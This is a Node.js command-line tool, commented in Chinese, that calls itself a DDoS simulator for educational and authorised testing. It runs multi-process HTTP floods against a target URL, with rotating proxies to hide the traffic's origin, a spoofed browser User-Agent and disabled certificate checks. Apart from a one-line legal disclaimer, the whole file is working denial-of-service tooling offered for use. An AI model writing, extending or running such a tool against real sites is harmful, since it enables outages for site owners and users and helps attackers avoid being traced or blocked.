#!/usr/bin/env node

/**
 * DDoS模拟测试脚本 - 仅用于教育目的和授权的测试环境
 * 注意：未经授权对网站进行DDoS攻击是违法的
 */

const http = require('http');
const https = require('https');
const { program } = require('commander');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const ProgressBar = require('./progress-bar');
const ProxyPool = require('./proxy-pool');

// 命令行参数配置
program
  .version('1.0.0')
  .description('DDoS模拟器 - 仅用于教育和授权测试')
  .requiredOption('-u, --url <url>', '目标URL (必须包含http://或https://)')
  .option('-c, --connections <number>', '并发连接数', '100')
  .option('-r, --requests <number>', '每个连接的请求数', '100')
  .option('-t, --timeout <number>', '请求超时时间(ms)', '5000')
  .option('-d, --delay <number>', '请求间隔时间(ms)', '10')
  .option('-m, --method <method>', '请求方法', 'GET')
  .option('-w, --workers <number>', '工作进程数 (默认为CPU核心数)', String(os.cpus().length))
  .option('--headers <headers>', '请求头 (JSON格式)', '{}')
  .option('--body <body>', '请求体 (POST/PUT请求)')
  .option('--proxy <proxy>', '单个代理服务器 (格式: ip:port 或 username:password@ip:port)')
  .option('--proxy-file <file>', '代理服务器列表文件 (每行一个代理)')
  .option('--proxy-rotate-requests <number>', '每N个请求轮换一次代理', '1')
  .parse(process.argv);

const options = program.opts();

// 验证URL
if (!options.url.startsWith('http://') && !options.url.startsWith('https://')) {
  console.error('错误: URL必须以http://或https://开头');
  process.exit(1);
}

// 解析URL
const url = new URL(options.url);
const isHttps = url.protocol === 'https:';
const httpModule = isHttps ? https : http;

// 统计数据
let stats = {
  sent: 0,
  success: 0,
  failed: 0,
  totalTime: 0,
  minTime: Number.MAX_SAFE_INTEGER,
  maxTime: 0,
};

// 请求头
let headers = {};
try {
  headers = JSON.parse(options.headers);
} catch (e) {
  console.error('错误: 无效的请求头JSON格式');
  process.exit(1);
}

// 初始化代理池
const proxyPool = new ProxyPool();
if (options.proxy) {
  proxyPool.addProxy(options.proxy);
}
if (options.proxyFile) {
  if (!proxyPool.loadFromFile(options.proxyFile)) {
    console.warn('警告: 无法加载代理文件，将不使用代理');
  }
}

// 每N个请求轮换一次代理
const proxyRotateRequests = parseInt(options.proxyRotateRequests) || 1;

// 使用集群模式
if (cluster.isPrimary) {
  console.log(`主进程 ${process.pid} 正在运行`);
  console.log(`目标: ${options.url}`);
  console.log(`并发连接数: ${options.connections}`);
  console.log(`每个连接的请求数: ${options.requests}`);
  console.log(`工作进程数: ${options.workers}`);
  
  // 显示代理信息
  const proxyStats = proxyPool.getStats();
  if (proxyStats.total > 0) {
    console.log(`使用代理: ${proxyStats.total}个`);
    console.log(`每${proxyRotateRequests}个请求轮换一次代理`);
  } else {
    console.log('未使用代理');
  }
  
  // 进度和统计信息
  let totalRequests = options.connections * options.requests * options.workers;
  let completedWorkers = 0;
  let mergedStats = { sent: 0, success: 0, failed: 0, totalTime: 0, minTime: Number.MAX_SAFE_INTEGER, maxTime: 0 };
  let proxySuccessCount = 0;
  let proxyFailCount = 0;
  
  // 创建进度条
  const progressBar = new ProgressBar({
    total: totalRequests,
    prefix: '测试进度',
    width: 30
  });
  
  console.log(`\n准备发送 ${totalRequests} 个请求...\n`);
  console.log('按 Ctrl+C 停止测试\n');
  
  // 开始时间
  const startTime = Date.now();
  
  // 将代理列表发送到所有工作进程
  const proxyList = proxyPool.proxies;
  
  // 创建工作进程
  for (let i = 0; i < options.workers; i++) {
    const worker = cluster.fork();
    
    // 发送代理列表到工作进程
    worker.send({ type: 'init', proxyList, proxyRotateRequests });
    
    worker.on('message', (msg) => {
      if (msg.type === 'stats') {
        mergedStats.sent += msg.stats.sent;
        mergedStats.success += msg.stats.success;
        mergedStats.failed += msg.stats.failed;
        mergedStats.totalTime += msg.stats.totalTime;
        mergedStats.minTime = Math.min(mergedStats.minTime, msg.stats.minTime);
        mergedStats.maxTime = Math.max(mergedStats.maxTime, msg.stats.maxTime);
        
        // 更新代理统计
        if (msg.proxyStats) {
          proxySuccessCount += msg.proxyStats.success || 0;
          proxyFailCount += msg.proxyStats.failed || 0;
        }
        
        // 更新进度条
        const elapsedTime = (Date.now() - startTime) / 1000;
        const rps = Math.floor(mergedStats.sent / elapsedTime);
        progressBar.update(mergedStats.sent, {
          '成功': mergedStats.success,
          '失败': mergedStats.failed,
          '请求/秒': rps
        });
      } else if (msg.type === 'done') {
        completedWorkers++;
        if (completedWorkers === parseInt(options.workers)) {
          // 所有工作进程完成，打印最终统计信息
          progressBar.complete();
          
          console.log('\n--- 测试完成 ---');
          console.log(`总请求数: ${mergedStats.sent}`);
          console.log(`成功请求: ${mergedStats.success}`);
          console.log(`失败请求: ${mergedStats.failed}`);
          
          const avgTime = mergedStats.success > 0 ? (mergedStats.totalTime / mergedStats.success).toFixed(2) : 0;
          console.log(`平均响应时间: ${avgTime}ms`);
          console.log(`最小响应时间: ${mergedStats.minTime === Number.MAX_SAFE_INTEGER ? 0 : mergedStats.minTime}ms`);
          console.log(`最大响应时间: ${mergedStats.maxTime}ms`);
          console.log(`请求成功率: ${((mergedStats.success / mergedStats.sent) * 100).toFixed(2)}%`);
          
          const totalTime = (Date.now() - startTime) / 1000;
          console.log(`总测试时间: ${totalTime.toFixed(2)}秒`);
          console.log(`平均请求/秒: ${(mergedStats.sent / totalTime).toFixed(2)}`);
          
          // 显示代理统计信息
          if (proxyPool.getStats().total > 0) {
            console.log(`\n--- 代理统计 ---`);
            console.log(`总代理数: ${proxyPool.getStats().total}`);
            console.log(`代理成功请求: ${proxySuccessCount}`);
            console.log(`代理失败请求: ${proxyFailCount}`);
          }
          
          // 终止所有工作进程
          Object.values(cluster.workers).forEach(worker => worker.kill());
        }
      }
    });
  }
  
  cluster.on('exit', (worker, code, signal) => {
    console.log(`工作进程 ${worker.process.pid} 已退出`);
  });
  
} else {
  // 工作进程代码
  console.log(`工作进程 ${process.pid} 已启动`);
  
  // 初始化工作进程的代理池
  let workerProxyPool = new ProxyPool();
  let proxyRotateCounter = 0;
  let proxyRotateRequests = 1;
  let proxyStats = { success: 0, failed: 0 };
  
  // 接收来自主进程的消息
  process.on('message', (msg) => {
    if (msg.type === 'init' && msg.proxyList) {
      workerProxyPool.addProxies(msg.proxyList);
      proxyRotateRequests = msg.proxyRotateRequests || 1;
    }
  });
  
  // 使用代理发送HTTP请求
  const sendRequestWithProxy = (proxy) => {
    return new Promise((resolve) => {
      const startTime = Date.now();
      
      // 解析代理
      const proxyOptions = ProxyPool.parseProxy(proxy);
      
      // 创建到代理服务器的连接
      const proxyReq = http.request({
        host: proxyOptions.host,
        port: proxyOptions.port,
        method: 'CONNECT',
        path: `${url.hostname}:${url.port || (isHttps ? 443 : 80)}`,
        headers: proxyOptions.auth ? {
          'Proxy-Authorization': 'Basic ' + Buffer.from(proxyOptions.auth).toString('base64')
        } : {}
      });
      
      proxyReq.on('connect', (proxyRes, socket, head) => {
        // 连接成功
        const requestOptions = {
          hostname: url.hostname,
          port: url.port || (isHttps ? 443 : 80),
          path: `${url.pathname}${url.search}`,
          method: options.method,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            ...headers
          },
          timeout: parseInt(options.timeout),
          rejectUnauthorized: false, // 忽略SSL证书验证(仅用于测试)
          socket: socket, // 使用代理创建的socket
          agent: false  // 不使用http(s)默认agent
        };
        
        const protocol = isHttps ? 'https:' : 'http:';
        const req = (protocol === 'https:' ? https : http).request(requestOptions, (res) => {
          res.on('data', () => {});
          res.on('end', () => {
            const endTime = Date.now();
            const responseTime = endTime - startTime;
            
            stats.sent++;
            stats.success++;
            stats.totalTime += responseTime;
            stats.minTime = Math.min(stats.minTime, responseTime);
            stats.maxTime = Math.max(stats.maxTime, responseTime);
            proxyStats.success++;
            
            socket.end();
            resolve();
          });
        });
        
        req.on('error', (e) => {
          stats.sent++;
          stats.failed++;
          proxyStats.failed++;
          socket.end();
          resolve();
        });
        
        req.on('timeout', () => {
          stats.sent++;
          stats.failed++;
          proxyStats.failed++;
          req.destroy();
          socket.end();
          resolve();
        });
        
        // 如果有请求体且方法不是GET
        if (options.body && options.method !== 'GET') {
          req.write(options.body);
        }
        
        req.end();
      });
      
      proxyReq.on('error', (e) => {
        stats.sent++;
        stats.failed++;
        proxyStats.failed++;
        resolve();
      });
      
      proxyReq.on('timeout', () => {
        stats.sent++;
        stats.failed++;
        proxyStats.failed++;
        proxyReq.destroy();
        resolve();
      });
      
      proxyReq.end();
    });
  };
  
  // 不使用代理发送HTTP请求
  const sendRequestDirect = () => {
    return new Promise((resolve) => {
      const startTime = Date.now();
      
      const requestOptions = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: `${url.pathname}${url.search}`,
        method: options.method,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
          ...headers
        },
        timeout: parseInt(options.timeout),
        rejectUnauthorized: false // 忽略SSL证书验证(仅用于测试)
      };
      
      const req = httpModule.request(requestOptions, (res) => {
        res.on('data', () => {});
        res.on('end', () => {
          const endTime = Date.now();
          const responseTime = endTime - startTime;
          
          stats.sent++;
          stats.success++;
          stats.totalTime += responseTime;
          stats.minTime = Math.min(stats.minTime, responseTime);
          stats.maxTime = Math.max(stats.maxTime, responseTime);
          
          resolve();
        });
      });
      
      req.on('error', (e) => {
        stats.sent++;
        stats.failed++;
        resolve();
      });
      
      req.on('timeout', () => {
        stats.sent++;
        stats.failed++;
        req.destroy();
        resolve();
      });
      
      // 如果有请求体且方法不是GET
      if (options.body && options.method !== 'GET') {
        req.write(options.body);
      }
      
      req.end();
    });
  };
  
  // 发送请求，可以选择使用代理
  const sendRequest = async () => {
    // 使用代理 - 如果有可用代理且当前请求需要轮换代理
    if (workerProxyPool.proxies.length > 0) {
      // 轮换代理计数器
      proxyRotateCounter = (proxyRotateCounter + 1) % proxyRotateRequests;
      
      // 到达轮换间隔或首次请求，获取新代理
      if (proxyRotateCounter === 0) {
        const proxy = workerProxyPool.getNext();
        return sendRequestWithProxy(proxy);
      }
    }
    
    // 直接发送请求（无代理）
    return sendRequestDirect();
  };
  
  // 创建连接并发送请求
  const createConnection = async (id) => {
    for (let i = 0; i < parseInt(options.requests); i++) {
      await sendRequest();
      
      // 周期性发送统计信息到主进程
      if (i % 10 === 0 || i === parseInt(options.requests) - 1) {
        process.send({ 
          type: 'stats', 
          stats: { ...stats },
          proxyStats: { ...proxyStats }
        });
      }
      
      // 添加延迟
      if (parseInt(options.delay) > 0) {
        await new Promise(resolve => setTimeout(resolve, parseInt(options.delay)));
      }
    }
  };
  
  // 并发启动多个连接
  const runTest = async () => {
    const connections = [];
    for (let i = 0; i < parseInt(options.connections); i++) {
      connections.push(createConnection(i));
    }
    
    await Promise.all(connections);
    
    // 发送最终统计和完成信号
    process.send({ 
      type: 'stats', 
      stats: { ...stats },
      proxyStats: { ...proxyStats }
    });
    process.send({ type: 'done' });
  };
  
  runTest();
} 